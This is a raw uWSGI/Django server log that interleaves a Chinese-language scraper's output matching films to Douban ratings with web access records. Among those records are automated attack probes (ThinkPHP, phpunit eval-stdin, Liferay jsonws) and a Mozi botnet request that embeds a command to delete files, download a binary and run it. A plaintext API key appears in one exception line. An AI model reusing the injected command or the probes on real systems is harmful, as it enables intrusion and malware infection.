功夫小子闯情关 1483577 6.4保存成功[douban]
1/2次同床 1422904 5.8保存成功[douban]
666魔鬼复活 1421924 5.9保存成功[douban]
铁马骝II之街头杀手 1293110 5.6保存成功[douban]
新上海滩 匹配到多个豆瓣id数据，存入列表2 ['1293142', '2248658']
天若有情3烽火佳人 1419918 7.0保存成功[douban]
疯蝶 2256002 0保存成功[douban]
旺角揸Fit人 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
奇异旅程之真心爱生命 1474961 7.0保存成功[douban]
阿金 1295555 7.0保存成功[douban]
百分百啱Feel 3042107 6.6保存成功[douban]
凤舞九天 3047748 6.5保存成功[douban]
金装香蕉俱乐部 1421926 7.0保存成功[douban]
猜火车 1292528 8.5保存成功[douban]
甜蜜蜜 1305164 8.8保存成功[douban]
黄飞鸿之八大天王 3237758 6.3保存成功[douban]
四个不平凡的少年 未匹配到合适id
----------地址被限制,稍后重试----------
浪漫风暴 1417370 6.7保存成功[douban]
勇闯夺命岛 1292728 8.6保存成功[douban]
偷偷爱你 1303482 7.8保存成功[douban]
去吧！揸Fit人兵团 1303922 6.8保存成功[douban]
旺角风云 1306361 6.3保存成功[douban]
漫画王 2061104 6.5保存成功[douban]
金榜题名 1890108 6.4保存成功[douban]
长征 2130014 6.9保存成功[douban]
运财五福星 未匹配到合适id
----------地址被限制,稍后重试----------
[pid: 24504|app: 0|req: 315/400] 49.235.61.48 () {34 vars in 499 bytes} [Sat May 30 17:52:07 2020] GET /TP/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24505|app: 0|req: 14/401] 49.235.61.48 () {34 vars in 485 bytes} [Sat May 30 17:52:07 2020] GET /TP/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
[pid: 24505|app: 0|req: 15/402] 49.235.61.48 () {34 vars in 521 bytes} [Sat May 30 17:52:07 2020] GET /thinkphp/html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24507|app: 0|req: 59/403] 49.235.61.48 () {34 vars in 503 bytes} [Sat May 30 17:52:07 2020] GET /html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24507|app: 0|req: 60/404] 49.235.61.48 () {34 vars in 493 bytes} [Sat May 30 17:52:07 2020] GET /public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
[pid: 24506|app: 0|req: 16/405] 49.235.61.48 () {34 vars in 509 bytes} [Sat May 30 17:52:08 2020] GET /TP/html/public/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
[pid: 24506|app: 0|req: 17/406] 49.235.61.48 () {34 vars in 481 bytes} [Sat May 30 17:52:08 2020] GET /elrekt.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24505|app: 0|req: 16/407] 49.235.61.48 () {34 vars in 479 bytes} [Sat May 30 17:52:08 2020] GET /index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
[pid: 24507|app: 0|req: 61/408] 49.235.61.48 () {34 vars in 464 bytes} [Sat May 30 17:52:08 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
天涯海角 1307724 8.0保存成功[douban]
重庆爱情感觉 1582251 6.4保存成功[douban]
秦颂 1298397 7.6保存成功[douban]
新喋血双雄 3005789 5.6保存成功[douban]
嫲嫲帆帆 未匹配到合适id
嫲嫲帆帆 无豆瓣id数据，存入列表
黄金岛历险记 1962057 6.4保存成功[douban]
歼灭行动 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
赌皇斗赌后 2003639 2.8保存成功[douban]
危险任务 1304996 5.0保存成功[douban]
神偷燕子李三 2239246 6.2保存成功[douban]
龙在少林 1419904 6.8保存成功[douban]
超级班长 3532292 7.7保存成功[douban]
舞女 未匹配到合适id
----------地址被限制,稍后重试----------
麻将 1297418 8.6保存成功[douban]
爸爸，你别骗我 3286433 0保存成功[douban]
英国病人 1291853 8.5保存成功[douban]
冰血暴 1292067 8.0保存成功[douban]
犬杀 3070707 6.0保存成功[douban]
白马飞飞 2340961 7.4保存成功[douban]
3个受伤的警察 未匹配到合适id
----------地址被限制,稍后重试----------
伴你高飞 1292642 8.9保存成功[douban]
猛鬼追魂04 血统 未匹配到合适id
猛鬼追魂04 血统 无豆瓣id数据，存入列表
惊声尖叫 1301630 7.1保存成功[douban]
赎金 1293619 7.3保存成功[douban]
惊世狂花 1292449 8.2保存成功[douban]
霹雳女狼星 1300136 0保存成功[douban]
火星人玩转地球 1297715 7.3保存成功[douban]
恐怖幽灵 1292739 7.2保存成功[douban]
甜心先生 1293158 7.4保存成功[douban]
王牌特派员 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
瓶装火箭 1294548 7.1保存成功[douban]
挑逗性游戏 1293427 6.0保存成功[douban]
赤胆豪情 1293333 6.3保存成功[douban]
剑侠风流 1299363 6.6保存成功[douban]
虎猛威龙 2132732 5.7保存成功[douban]
千钧一发1995 未匹配到合适id
----------地址被限制,稍后重试----------
潜龙轰天2 未匹配到合适id
----------地址被限制,稍后重试----------
少年陈浩南 未匹配到合适id
----------地址被限制,稍后重试----------
人鱼童话2 未匹配到合适id
----------地址被限制,稍后重试----------
真实的谎言 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 316/409] 116.128.128.41 () {36 vars in 555 bytes} [Sat May 30 18:27:13 2020] GET /hudson => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
----------重新启动查找------------
风中奇缘 未匹配到合适id
----------地址被限制,稍后重试----------
金玉满堂 未匹配到合适id
----------地址被限制,稍后重试----------
[pid: 24504|app: 0|req: 317/410] 195.54.160.130 () {38 vars in 610 bytes} [Sat May 30 18:58:03 2020] POST /api/jsonws/invoke => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
心之全蚀 未匹配到合适id
----------地址被限制,稍后重试----------
虎胆龙威3 1299837 7.9保存成功[douban]
异种1 未匹配到合适id
异种1 无豆瓣id数据，存入列表
007之黄金眼 1292677 7.5保存成功[douban]
重案实录之污点证人 4223361 4.6保存成功[douban]
不道德的礼物 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
夜半一点钟 1388234 6.2保存成功[douban]
烈火战车 1295316 6.9保存成功[douban]
流氓医生 1358421 7.7保存成功[douban]
救世神棍 1305376 6.5保存成功[douban]
捍卫机密 1298111 6.2保存成功[douban]
矮子当道 1293335 7.2保存成功[douban]
和平饭店 1293867 7.7保存成功[douban]
霹雳火 1299502 6.9保存成功[douban]
高压线 未匹配到合适id
----------地址被限制,稍后重试----------
[pid: 24504|app: 0|req: 318/411] 45.76.144.219 () {36 vars in 432 bytes} [Sat May 30 19:06:40 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
大冒险家 1299584 6.4保存成功[douban]
鼠胆龙威 1295106 7.2保存成功[douban]
慈云山十三太保 2003865 5.8保存成功[douban]
仙乐飘飘 1303218 6.6保存成功[douban]
刀 1401962 8.1保存成功[douban]
祖孙情 未匹配到合适id
祖孙情 无豆瓣id数据，存入列表
七宗罪 1292223 8.8保存成功[douban]
岁月情真 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
冒牌皇帝 2003850 5.9保存成功[douban]
重案实录之污点证人 4223361 4.6保存成功[douban]
[pid: 24504|app: 0|req: 319/412] 49.143.32.6 () {34 vars in 639 bytes} [Sat May 30 19:13:35 2020] GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 179 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
无面俾 1307619 6.7保存成功[douban]
十二猴子 1298744 8.2保存成功[douban]
九纹龙的谎言 1306499 6.2保存成功[douban]
鬼巴士 未匹配到合适id
----------地址被限制,稍后重试----------
爱在黎明破晓前 1296339 8.8保存成功[douban]
庙街故事 1300205 6.5保存成功[douban]
新扎师兄追女仔 1302593 6.4保存成功[douban]
中国龙 1864541 6.8保存成功[douban]
臭屁王 1416722 7.4保存成功[douban]
黑色追杀令 1297559 6.1保存成功[douban]
天生胆小 未匹配到合适id
----------地址被限制,稍后重试----------
花月佳期 1298528 7.9保存成功[douban]
错体追击组合 1482466 6.4保存成功[douban]
新乌龙院2无敌反斗星 1304132 7.5保存成功[douban]
抢闸妈咪 1300511 0保存成功[douban]
有儿万事足 5915790 0保存成功[douban]
赌圣2：街头赌圣 1433602 6.1保存成功[douban]
地下 1292206 9.2保存成功[douban]
廊桥遗梦 1293929 8.7保存成功[douban]
女人四十 未匹配到合适id
----------地址被限制,稍后重试----------
飞虎队 1437842 7.0保存成功[douban]
非常嫌疑犯 1292214 8.6保存成功[douban]
勇敢的心 1294639 8.9保存成功[douban]
边缘日记 1292585 8.2保存成功[douban]
叠影谋杀案 1294197 6.7保存成功[douban]
魔鬼骑士 1293565 6.7保存成功[douban]
绝地战警 1296102 7.4保存成功[douban]
二见钟情 1295899 7.7保存成功[douban]
情归巴黎 未匹配到合适id
----------地址被限制,稍后重试----------
死囚漫步 1292703 8.0保存成功[douban]
未来水世界 1294037 7.4保存成功[douban]
割喉岛 1299415 6.9保存成功[douban]
云中漫步 1300945 7.8保存成功[douban]
刚果惊魂 1299284 6.6保存成功[douban]
非常特务 1298111 6.2保存成功[douban]
魔鬼帝国 未匹配到合适id
魔鬼帝国 无豆瓣id数据，存入列表
大话西游之月光宝盒 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
大话西游之大圣娶亲 1292213 9.2保存成功[douban]
七金刚 匹配到多个豆瓣id数据，存入列表2 ['1306431', '34840109']
火烧红莲寺 1297258 6.8保存成功[douban]
白头神探3：终极悔辱 未匹配到合适id
白头神探3：终极悔辱 无豆瓣id数据，存入列表
神探飞机头1 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
这个杀手不太冷 1295644 9.4保存成功[douban]
肖申克的救赎 1292052 9.7保存成功[douban]
寻仇阴阳界 1306968 6.0保存成功[douban]
笑林小子2：新乌龙院 1308927 7.8保存成功[douban]
旋风小子 1408312 7.9保存成功[douban]
星际旅行7：斗转星移 1293904 7.1保存成功[douban]
低俗小说 1291832 8.8保存成功[douban]
活着 未匹配到合适id
----------地址被限制,稍后重试----------
[pid: 24504|app: 0|req: 320/413] 27.18.144.3 () {44 vars in 865 bytes} [Sat May 30 19:37:20 2020] GET /video/play/82978/1-10.html => generated 19554 bytes in 9 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
奔向自由 1298132 0保存成功[douban]
新边缘人 1471317 6.9保存成功[douban]
暴雨骄阳 1298610 6.8保存成功[douban]
弒兄奇案 4312574 5.4保存成功[douban]
男儿当入樽 1304619 5.3保存成功[douban]
等着你回来 1295036 6.7保存成功[douban]
小鬼当街 1299952 8.2保存成功[douban]
醉拳2 1307319 7.7保存成功[douban]
赌神2 未匹配到合适id
----------地址被限制,稍后重试----------
刀剑笑 1301982 6.4保存成功[douban]
天与地 1305829 7.2保存成功[douban]
乱世超人 未匹配到合适id
----------地址被限制,稍后重试----------
花旗少林 未匹配到合适id
----------地址被限制,稍后重试----------
醉拳3 未匹配到合适id
----------地址被限制,稍后重试----------
重案实录之惊天械劫案 未匹配到合适id
----------地址被限制,稍后重试----------
省港一号通缉犯 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 321/414] 122.51.24.114 () {40 vars in 606 bytes} [Sat May 30 20:15:14 2020] GET /index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24506|app: 0|req: 18/415] 122.51.24.114 () {38 vars in 599 bytes} [Sat May 30 20:15:14 2020] GET /phpmyadmin/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 322/416] 83.143.86.62 () {34 vars in 422 bytes} [Sat May 30 20:25:21 2020] GET /Lists/admin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
----------重新启动查找------------
梦差人 1305764 7.1保存成功[douban]
伦文叙老点柳先开 1408298 6.9保存成功[douban]
报告班长3 1303980 6.7保存成功[douban]
亡命天涯 未匹配到合适id
亡命天涯 无豆瓣id数据，存入列表
重庆森林 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
O记重案实录 1292698 6.7保存成功[douban]
钟馗嫁妹 1479875 5.8保存成功[douban]
少林英雄之方世玉洪熙官 2148296 6.1保存成功[douban]
新同居时代 1302160 6.9保存成功[douban]
新大小不良 1296695 5.9保存成功[douban]
一九四九之劫后英雄传 2240941 6.5保存成功[douban]
人鱼传说 匹配到多个豆瓣id数据，存入列表2 ['1302673', '1296903']
珠光宝气 1304420 6.3保存成功[douban]
沉默的姑娘 1302411 6.1保存成功[douban]
梁祝 1310159 8.0保存成功[douban]
点指兵兵之青年干探 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
燃情岁月 匹配到多个豆瓣id数据，存入列表2 ['1295865', '1305824']
六指琴魔 1300265 7.1保存成功[douban]
头发乱了 1427439 6.5保存成功[douban]
背靠背，脸对脸 1307856 9.4保存成功[douban]
蓝白红三部曲之红 1292047 8.7保存成功[douban]
倾城佳话 1296132 7.5保存成功[douban]
达摩祖师 1295299 8.1保存成功[douban]
蓝白红三部曲之白 1292049 8.4保存成功[douban]
猛鬼街7 1297010 6.6保存成功[douban]
风月俏佳人 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
警察学校7.莫斯科任务 未匹配到合适id
警察学校7.莫斯科任务 无豆瓣id数据，存入列表
国产凌凌漆 1307739 8.3保存成功[douban]
机智问答 1292759 8.0保存成功[douban]
精武英雄 1292895 8.4保存成功[douban]
疯狂店员 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
方世玉与洪熙官1993 未匹配到合适id
方世玉与洪熙官1993 无豆瓣id数据，存入列表
天生杀人狂 1292229 8.0保存成功[douban]
街头霸王 匹配到多个豆瓣id数据，存入列表2 ['1297176', '1293991']
致命距离 1295532 6.0保存成功[douban]
妮基塔 未匹配到合适id
妮基塔 无豆瓣id数据，存入列表
终极标靶 1295871 6.6保存成功[douban]
魔鬼银爪 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
现代豪侠传 1295858 7.2保存成功[douban]
东方不败风云再起 1394324 7.4保存成功[douban]
东方三侠 匹配到多个豆瓣id数据，存入列表2 ['1304091', '1295858']
黄飞鸿之三：狮王争霸 未匹配到合适id
黄飞鸿之三：狮王争霸 无豆瓣id数据，存入列表
青蛇 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
岁月风云之上海皇帝 1300575 7.9保存成功[douban]
逃学威龙3之龙过鸡年 1302678 7.4保存成功[douban]
倚天屠龙记之魔教教主 1299059 7.7保存成功[douban]
机器战警3 1300371 6.7保存成功[douban]
芳芳 1293377 8.1保存成功[douban]
太极张三丰 1294561 7.8保存成功[douban]
坏小子巴比 1296847 8.1保存成功[douban]
虎穴屠龙之轰天陷阱 未匹配到合适id
----------地址被限制,稍后重试----------
火爆大圈仔 25727209 0保存成功[douban]
边城浪子 匹配到多个豆瓣id数据，存入列表2 ['1304538', '26113506']
新流星蝴蝶剑 1298589 6.8保存成功[douban]
反斗马骝 1456499 6.4保存成功[douban]
方世玉续集 1295485 7.7保存成功[douban]
风尘三侠 1302939 7.2保存成功[douban]
第一诱惑 3096132 0保存成功[douban]
旭日追凶 1294543 6.1保存成功[douban]
金色豪门 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
城市猎人 1295064 7.6保存成功[douban]
重案组 1299966 7.1保存成功[douban]
走上不归路 2301444 6.3保存成功[douban]
超级学校霸王 1305582 7.4保存成功[douban]
少年黄飞鸿之铁马骝 1294488 7.5保存成功[douban]
苏乞儿 1865903 6.5保存成功[douban]
天长地久 1299822 7.4保存成功[douban]
太子传说 1768619 6.4保存成功[douban]
射雕英雄传之东成西就 未匹配到合适id
----------地址被限制,稍后重试----------
飞越迷情 未匹配到合适id
飞越迷情 无豆瓣id数据，存入列表
将计就计 1463357 6.9保存成功[douban]
富贵狂花 1306113 6.6保存成功[douban]
城市女猎人 2146855 5.4保存成功[douban]
追男仔 1401641 7.3保存成功[douban]
笑侠楚留香 1295061 5.9保存成功[douban]
夏日情未了 1299730 7.0保存成功[douban]
飞狐外传 1300204 6.6保存成功[douban]
黄飞鸿之四：王者之风 1294011 7.1保存成功[douban]
神经刀与飞天猫 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
赤脚小子 1474336 7.0保存成功[douban]
雨夜天魔 3081376 5.7保存成功[douban]
新难兄难弟 1297032 8.0保存成功[douban]
异域之末路英雄 1303227 7.3保存成功[douban]
[pid: 24504|app: 0|req: 323/417] 182.254.52.17 () {36 vars in 542 bytes} [Sat May 30 21:07:11 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
新仙鹤神针 1298761 7.1保存成功[douban]
三个夏天 未匹配到合适id
三个夏天 无豆瓣id数据，存入列表
情人知己 1765623 7.1保存成功[douban]
驱魔道长 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
画皮之阴阳法王 未匹配到合适id
画皮之阴阳法王 无豆瓣id数据，存入列表
溶尸奇案 1305945 7.1保存成功[douban]
七侠五义之五鼠闹东京 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
[pid: 24504|app: 0|req: 324/418] 113.69.35.29 () {46 vars in 1000 bytes} [Sat May 30 21:12:02 2020] GET /video/search/?wd=%E9%A9%AF%E9%BE%99%E9%AB%98%E6%89%8B&page=1 => generated 16998 bytes in 55 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 325/419] 113.69.35.29 () {46 vars in 950 bytes} [Sat May 30 21:12:10 2020] GET /video/play/55965/ => generated 14840 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
蝎子之灭杀行动 未匹配到合适id
----------地址被限制,稍后重试----------
[pid: 24504|app: 0|req: 326/420] 113.69.35.29 () {46 vars in 947 bytes} [Sat May 30 21:14:03 2020] GET /video/play/43782/ => generated 13958 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
廉政第一击 未匹配到合适id
----------地址被限制,稍后重试----------
龙跨四海之致命情人 未匹配到合适id
----------地址被限制,稍后重试----------
[pid: 24504|app: 0|req: 327/421] 49.145.210.86 () {32 vars in 470 bytes} [Sat May 30 21:21:03 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
一屋哨牙鬼 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
----------重新启动查找------------
武侠七公主 未匹配到合适id
----------地址被限制,稍后重试----------
芝士火腿 未匹配到合适id
----------地址被限制,稍后重试----------
一刀倾城 未匹配到合适id
一刀倾城 无豆瓣id数据，存入列表
钵兰街大少 2146107 6.2保存成功[douban]
消失的女人 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
龙父虎子 未匹配到合适id
龙父虎子 无豆瓣id数据，存入列表
新碧血剑 1305837 6.9保存成功[douban]
上海皇帝之雄霸天下 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
redis_dump exception: HTTPConnectionPool(host='api.douban.com', port=80): Max retries exceeded with url: /v2/movie/subject/1294753?apikey=0df993c66c0c636e29ecbb5344252a4a (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f41801c7630>: Failed to establish a new connection: [Errno 110] Connection timed out',))
[pid: 24504|app: 0|req: 327/422] 183.27.45.190 () {46 vars in 868 bytes} [Wed May 27 00:07:53 2020] GET /admin/get_rating/ => generated 337 bytes in 338817801 msecs (HTTP/1.1 200) 5 headers in 150 bytes (1 switches on core 0)
[pid: 24504|app: 0|req: 328/423] 27.18.144.3 () {44 vars in 866 bytes} [Sat May 30 22:15:45 2020] GET /video/play/82978/1-11.html => generated 19554 bytes in 9 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
[pid: 24507|app: 0|req: 62/424] 195.54.160.130 () {36 vars in 624 bytes} [Sat May 30 22:36:14 2020] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24505|app: 0|req: 17/425] 113.69.35.29 () {48 vars in 967 bytes} [Sat May 30 22:48:16 2020] GET /admin/view_log/ => generated 19699 bytes in 26 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 329/426] 113.69.35.29 () {46 vars in 958 bytes} [Sat May 30 22:48:25 2020] GET /admin/view_log/?page=2 => generated 19377 bytes in 19 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
[pid: 24504|app: 0|req: 330/427] 113.69.35.29 () {46 vars in 965 bytes} [Sat May 30 22:48:32 2020] GET /admin/view_log/?page=3 => generated 19531 bytes in 19 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 331/428] 113.69.35.29 () {46 vars in 965 bytes} [Sat May 30 22:48:35 2020] GET /admin/view_log/?page=4 => generated 19598 bytes in 18 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
[pid: 24504|app: 0|req: 332/429] 113.69.35.29 () {46 vars in 965 bytes} [Sat May 30 22:48:38 2020] GET /admin/view_log/?page=6 => generated 19453 bytes in 30 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 333/430] 113.69.35.29 () {46 vars in 965 bytes} [Sat May 30 22:48:41 2020] GET /admin/view_log/?page=8 => generated 19567 bytes in 23 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
[pid: 24504|app: 0|req: 334/431] 113.69.35.29 () {46 vars in 967 bytes} [Sat May 30 22:48:46 2020] GET /admin/view_log/?page=11 => generated 19514 bytes in 19 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 335/432] 113.69.35.29 () {46 vars in 968 bytes} [Sat May 30 22:48:49 2020] GET /admin/view_log/?page=16 => generated 18503 bytes in 20 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
[pid: 24504|app: 0|req: 336/433] 113.69.35.29 () {46 vars in 1010 bytes} [Sat May 30 22:51:08 2020] GET /video/search/?wd=%E5%90%91%E5%BE%80%E7%9A%84%E7%94%9F%E6%B4%BB&page=1 => generated 17913 bytes in 55 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 337/434] 113.69.35.29 () {46 vars in 959 bytes} [Sat May 30 22:51:10 2020] GET /video/play/84919/ => generated 15113 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
[pid: 24504|app: 0|req: 338/435] 113.69.35.29 () {46 vars in 923 bytes} [Sat May 30 22:51:16 2020] GET /video/play/84919/1-9.html => generated 15104 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 339/436] 113.69.35.29 () {46 vars in 929 bytes} [Sat May 30 22:52:22 2020] GET /video/ => generated 58832 bytes in 388 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
[pid: 24504|app: 0|req: 340/437] 113.69.35.29 () {46 vars in 968 bytes} [Sat May 30 22:53:24 2020] GET /admin/view_log/?page=16 => generated 18807 bytes in 21 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 341/438] 113.69.35.29 () {46 vars in 968 bytes} [Sat May 30 22:53:50 2020] GET /admin/view_log/?page=15 => generated 19631 bytes in 19 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
[pid: 24504|app: 0|req: 342/439] 113.69.35.29 () {46 vars in 968 bytes} [Sat May 30 22:53:52 2020] GET /admin/view_log/?page=16 => generated 18917 bytes in 20 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 343/440] 193.118.53.202 () {34 vars in 488 bytes} [Sat May 30 23:05:05 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
[pid: 24504|app: 0|req: 344/441] 113.69.35.29 () {46 vars in 966 bytes} [Sat May 30 23:07:31 2020] GET /admin/view_log/?page=1 => generated 19699 bytes in 19 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 345/442] 113.69.35.29 () {44 vars in 982 bytes} [Sat May 30 23:08:41 2020] GET /video/search/?wd=%E4%B8%9B%E6%9E%97%E5%A5%87%E5%85%B5&page=1 => generated 14424 bytes in 52 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
[pid: 24504|app: 0|req: 346/443] 113.69.35.29 () {44 vars in 982 bytes} [Sat May 30 23:08:41 2020] GET /video/search/?wd=%E4%B8%9B%E6%9E%97%E5%A5%87%E5%85%B5&page=1 => generated 14424 bytes in 51 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 347/444] 113.69.35.29 () {46 vars in 994 bytes} [Sat May 30 23:08:43 2020] GET /video/play/75519/ => generated 14501 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
[pid: 24504|app: 0|req: 348/445] 195.54.160.130 () {38 vars in 712 bytes} [Sat May 30 23:13:02 2020] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 349/446] 182.254.52.17 () {36 vars in 592 bytes} [Sat May 30 23:22:44 2020] GET /video/play/82978/1-9.html => generated 19553 bytes in 9 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Sat May 30 23:51:32 2020] ***
compiled with version: 7.4.0 on 31 January 2020 10:32:09
os: Linux-4.15.0-54-generic #58-Ubuntu SMP Mon Jun 24 10:55:24 UTC 2019
nodename: VM-32-8-ubuntu
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/ubuntu/git/django_project
writing pidfile to ./uwsgi.pid
detected binary path: /home/ubuntu/.local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
chdir() to /home/ubuntu/git/django_project
your processes number limit is 7079
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 127.0.0.1:8001 fd 6
Python version: 3.6.8 (default, Oct  7 2019, 12:59:55)  [GCC 8.3.0]
Python main interpreter initialized at 0x55ef80deb540
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416720 bytes (406 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55ef80deb540 pid: 8596 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 8596)
spawned uWSGI worker 1 (pid: 8598, cores: 2)
spawned uWSGI worker 2 (pid: 8599, cores: 2)
spawned uWSGI worker 3 (pid: 8600, cores: 2)
spawned uWSGI worker 4 (pid: 8601, cores: 2)
[pid: 8599|app: 0|req: 1/1] 113.69.35.29 () {48 vars in 997 bytes} [Sat May 30 23:51:37 2020] GET /admin/view_log/?page=1 => generated 19699 bytes in 232 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
[pid: 8599|app: 0|req: 2/2] 113.69.35.29 () {46 vars in 934 bytes} [Sat May 30 23:51:40 2020] GET /admin/ => generated 27873 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
————————开始获取豆瓣id数据————————
无豆瓣id的视频总数：3503
无匹配视频总数：2420
[pid: 8598|app: 0|req: 2/3] 113.69.35.29 () {46 vars in 936 bytes} [Sat May 30 23:51:43 2020] GET /admin/view_log/ => generated 19699 bytes in 36 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
[pid: 8598|app: 0|req: 3/4] 113.69.35.29 () {46 vars in 960 bytes} [Sat May 30 23:51:47 2020] GET /admin/view_log/?page=16 => generated 19915 bytes in 20 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 1)
斗破乱世情 30481986 0保存成功[douban]
[pid: 8599|app: 0|req: 3/5] 113.69.35.29 () {46 vars in 968 bytes} [Sat May 30 23:51:53 2020] GET /admin/view_log/?page=17 => generated 14901 bytes in 20 msecs (HTTP/1.1 200) 5 headers in 152 bytes (1 switches on core 0)
